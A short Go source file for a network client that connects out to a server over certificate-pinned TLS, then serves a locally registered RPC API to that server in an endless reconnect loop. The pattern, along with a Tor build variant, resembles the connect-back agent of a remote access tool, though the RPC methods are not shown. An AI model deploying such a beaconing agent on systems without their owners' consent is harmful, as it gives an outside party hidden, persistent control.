// +build !tor

package client

import (
	"crypto/tls"
	"crypto/x509"
	"log"
	"net"
	"net/rpc"
	"time"
)

// connect dials a remote address and returns the tls.Client to NetClient
func connect() (net.Conn, error) {
	conn, err := net.Dial("tcp", s.addr)
	if err != nil {
		return nil, err
	}

	log.Println("[NetClient] [+] Connection to server successful")
	caPool := x509.NewCertPool()
	caPool.AddCert(s.cert)

	config := tls.Config{RootCAs: caPool, ServerName: s.domain}
	tlsconn := tls.Client(conn, &config)
	if err != nil {
		return nil, err
	}
	return tlsconn, nil
}

// NetClient starts a connection and invokes connect
func NetClient() {
	log.Println("[NetClient] Starting connection")
	initServer()

	api := new(API)

	if rpcErr := rpc.Register(api); rpcErr != nil {
		log.Fatal("[NetClient] [!] Could not register RPC API:", rpcErr)
	}

	for {
		conn, err := connect()
		if err != nil {
			log.Println("[NetClient] [!] Could not connect:", err)
			time.Sleep(25 * time.Second)
			continue
		}
		rpc.ServeConn(conn)
	}
}
